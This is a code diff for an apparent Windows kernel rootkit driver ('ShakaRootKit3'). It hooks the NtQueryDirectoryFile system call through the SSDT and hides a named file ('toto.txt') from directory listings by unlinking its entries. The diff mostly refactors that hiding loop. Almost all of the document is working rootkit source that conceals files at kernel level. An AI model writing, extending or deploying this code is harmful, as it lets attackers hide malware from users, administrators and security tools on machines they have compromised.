@@ -3,8 +3,9 @@
 
 #define DeviceName L"\\Device\\hook"
 #define LnkDeviceName L"\\DosDevices\\hook" 
+#define HIDING L"toto.txt"
 
-// Rootkit: C:\ShakaRootKit3\objchk_win7_x86\i386\shakadriver.sy
+// Rootkit: C:\ShakaRootKit3\objchk_win7_x86\i386\shakadriver.sys
 
 #pragma pack(1)
 typedef struct ServiceDescriptorEntry {
@@ -14,7 +15,7 @@ typedef struct ServiceDescriptorEntry {
         unsigned char *ParamTableBase;
 } ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
 #pragma pack()
-__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable; // symbole exporte par le noyau pour lire la ssdt
+__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable; 
 
 PMDL  g_pmdlSystemCall;
 PVOID *MappedSystemCallTable;
@@ -117,51 +118,36 @@ NTSTATUS NewNtQueryDirectoryFile(
 		RestartScan
 	);
 	
-
-	RtlInitUnicodeString(&fileToHideName, L"toto.txt"); 
+	RtlInitUnicodeString(&fileToHideName, HIDING); 
 	DbgPrint("#=== ShakaHook NtQueryDirectoryFile ===#\n");
 	DbgPrint("FileInformationClass: %d\n", FileInformationClass);
 	
 	switch (FileInformationClass)
 	{
-		/*case 12: // _FILE_NAMES_INFORMATION 
-			pFI = (PFILE_NAMES_INFORMATION) FileInformation;			filename.Length = ((PFILE_NAMES_INFORMATION) pFI)->FileNameLength;
-			filename.Buffer = ((PFILE_NAMES_INFORMATION) pFI)->FileName;
-			DbgPrint("filename %wZ\n", filename);
-			break;
-			*/
 		case 37: // FILE_ID_BOTH_DIR_INFORMATION 
-			DbgPrint("FILE_ID_BOTH_DIR_INFORMATION \n");
-
-			precedentFileIdBothDirInformation = (PFILE_ID_BOTH_DIR_INFORMATION) ((ULONG) FileInformation + offset);
+			fileIdBothDirInformation = precedentFileIdBothDirInformation = (PFILE_ID_BOTH_DIR_INFORMATION) ((ULONG) FileInformation + offset);
 			offset += (ULONG) (precedentFileIdBothDirInformation->NextEntryOffset);
 			
-			do
+			while (fileIdBothDirInformation->NextEntryOffset != 0 && offset < Length)
 			{
 				fileIdBothDirInformation = (PFILE_ID_BOTH_DIR_INFORMATION) ((ULONG) FileInformation + offset);
 				filename.Length = fileIdBothDirInformation->FileNameLength;
 				filename.Buffer = (PWSTR)(fileIdBothDirInformation->FileName);
 
-				// DbgPrint("offset %ld, filename %wZ \n", offset, &filename);
-				// DbgPrint("%wZ == %wZ \n", &filename, &fileToHideName);
 				if (RtlCompareUnicodeString(&filename, &fileToHideName, TRUE) == 0)
 				{
+					DbgPrint("Hiding %wZ \n", &filename);
 					if (fileIdBothDirInformation->NextEntryOffset == 0)
-					{
-						DbgPrint("Hiding (last) %wZ \n", &filename);
-						precedentFileIdBothDirInformation->NextEntryOffset = 0;
-					}
+							precedentFileIdBothDirInformation->NextEntryOffset = 0;
 					else
-					{
-						DbgPrint("Hiding (not last) %wZ \n", &filename);
 						precedentFileIdBothDirInformation->NextEntryOffset += fileIdBothDirInformation->NextEntryOffset;
-					}
 				}
 				offset += (ULONG) (fileIdBothDirInformation->NextEntryOffset);
 				precedentFileIdBothDirInformation = fileIdBothDirInformation;
+			}
+			break; 
 
-			} while(fileIdBothDirInformation->NextEntryOffset != 0 && offset < Length);
-			
+		default:
 			break;
 	}
 	return rc;
